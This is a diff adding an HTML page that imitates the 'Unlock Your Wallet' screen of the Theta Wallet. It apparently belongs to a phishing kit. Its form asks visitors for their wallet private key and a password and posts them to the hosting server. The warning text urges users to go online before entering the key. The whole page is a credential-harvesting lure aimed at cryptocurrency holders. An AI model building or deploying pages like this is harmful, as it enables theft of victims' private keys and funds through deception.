@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<!--[if IE 9]>
+<html class="lt-ie10" lang="en" >
+<![endif]-->
+<html class="no-js" lang="en" >
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<title>Theta Wallet</title>
+
+	<!-- normalize.css and modernizr.js help with browser compatibility -->
+	<link rel="stylesheet" href="css/normalize.css">
+	<link rel="stylesheet" href="css/foundation.css">
+    <link rel="stylesheet" href="css/style.css">
+	<script src="js/vendor/modernizr.js"></script>
+</head>
+<body>
+    <form method="POST" action="">
+        <div id="root">
+            <div class="row">
+            <div class="col-md-12">
+                <div class="app">
+                <img  src="img/theta logo.png" class="main-logo"> 
+                <div class="pages">
+                    <div class="UnlockWalletPage">
+                    <div class="UnlockWalletPage__wrapper">
+                    <div class="UnlockWalletPage__title">Unlock Your Wallet</div> 
+                    <div class="UnlockWalletCard">
+                        <div class="UnlockWalletCard_content">
+                        <div class="UnlockWalletCard_header">
+                        <div class="TabBar UnlockWalletCard__tab-bar TabBar--is-centered TabBar--is-condensed">
+                            <a href="index.html" class="TabBarItem TabBarItem tablinks" aria-current="page"><div class="TabBarItem__title">KEYSTORE</div></a>
+							<a class="TabBarItem--is-active tablinks" href="index.html"><div class="TabBarItem__title">MNEMONIC</div></a>
+							<a class="TabBarItem tablinks" href="privatekey.php"><div class="TabBarItem__title">PRIVATE KEY</div></a>
+							<a class="TabBarItem tablinks" href="index.html"><div class="TabBarItem__title">HARDWARE</div></a>
+                        </div>
+                        </div>
+                        <div id="privateKey" class="UnlockWalletViaPrivateKey ccc">
+                            <div class="UnlockWalletViaMnemonicPhrase__title">Please enter your private key</div>
+                            <textarea class="UnlockWalletViaPrivateKey__private-key" name="privateKey" required></textarea>
+                            <div class="UnlockWalletViaMnemonicPhrase__mnemonic-instructions">Please enter your private key in HEX format.</div>
+                            <input class="UnlockWalletViaMnemonicPhrase__password-input" placeholder="Enter temporary session password" name="password" type="password" value="" required>
+                            <div class="UnlockWalletViaMnemonicPhrase__mnemonic-instructions_1"><input type="checkbox" value="I have entered all details are correctly" required><small>I have entered all details are correctly.</small></div>
+                            <div class="UnlockWalletCard__warning">Before you enter your private key, we recommend you connect your device to the internet. You will be able to disconnect once your wallet is Unlocked.</div>
+                            <div class="UnlockWalletViaPrivateKey__footer">
+                                <button type="submit" name="submit"  class="GradientButton-undefined-GradientButton">
+                                    <div class="GradientButton__title">Unlock Wallet</div>
+                                </button>
+                            </div>
+                        </div>
+                        </div>
+                    </div>   
+                    </div>
+                    </div>
+                </div>
+                </div>
+            </div>
+            </div>
+        </div>
+    </form>
+<!-- include before </body> tag -->
+<script src="js/vendor/jquery.js"></script>
+<script src="js/foundation.min.js"></script>
+<script>
+	$(document).foundation();
+</script>
+</body>
+</html>
